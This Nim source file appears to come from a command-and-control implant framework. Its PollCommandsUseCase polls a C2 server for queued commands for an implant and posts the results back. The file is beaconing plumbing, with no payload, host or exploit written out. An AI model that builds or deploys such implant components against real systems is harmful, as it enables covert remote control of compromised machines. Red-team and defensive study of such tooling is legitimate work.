#[
    Use Case: PollCommandsUseCase
    Orchestrates polling for commands from C2 server
    Applies Single Responsibility Principle
    
    Uses concrete repository that implements the CommunicationRepositoryPort defined in domain/ports/out/.
    This is valid in hexagonal architecture - use cases can use concrete implementations
    that implement the ports, ensuring dependency inversion at the conceptual level.
]#

import asyncdispatch, times
import ../../domain/models/command as cmdModel
import ../../domain/models/implant
import ../../infrastructure/repositories/communication_repository

type
    PollCommandsUseCase* = object
        communicationRepo*: CommunicationRepository
    
proc newPollCommandsUseCase*(communicationRepo: CommunicationRepository): PollCommandsUseCase =
    ## Create a new PollCommandsUseCase instance
    result = PollCommandsUseCase(communicationRepo: communicationRepo)

proc pollForCommand*(useCase: PollCommandsUseCase, implant: Implant): Future[cmdModel.Command] {.async.} =
    ## Poll C2 server for a pending command
    when defined debug:
        echo "[DEBUG] PollCommandsUseCase: Polling for commands..."
    
    # Poll C2 server
    let (cmdGuid, cmd, cmdArgs) = await useCase.communicationRepo.getQueuedCommand(implant)
    
    var cmdObj: cmdModel.Command
    if cmd != "":
        # Create command object directly
        cmdObj = cmdModel.Command(
            guid: cmdGuid,
            command: cmd,
            args: cmdArgs,
            targetClientId: "",
            timestamp: epochTime().int64
        )
        
        when defined debug:
            echo "[DEBUG] PollCommandsUseCase: Received command: " & cmd & " (GUID: " & cmdGuid & ")"
    else:
        # No command available
        cmdObj = cmdModel.Command(
            guid: "",
            command: "",
            args: @[],
            targetClientId: "",
            timestamp: epochTime().int64
        )
        
        when defined debug:
            echo "[DEBUG] PollCommandsUseCase: No commands available"
    
    result = cmdObj

proc sendResult*(useCase: PollCommandsUseCase, implant: Implant, cmdResult: cmdModel.CommandResult): Future[bool] {.async.} =
    ## Send command result to C2 server
    when defined debug:
        echo "[DEBUG] PollCommandsUseCase: Sending result (GUID: " & cmdResult.guid & ")"
    
    # Send result to C2 server
    let success = await useCase.communicationRepo.postCommandResults(implant, cmdResult.guid, cmdResult.result)
    
    if success:
        when defined debug:
            echo "[DEBUG] PollCommandsUseCase: Result sent successfully"
    else:
        when defined debug:
            echo "[DEBUG] PollCommandsUseCase: Failed to send result"
    
    return success
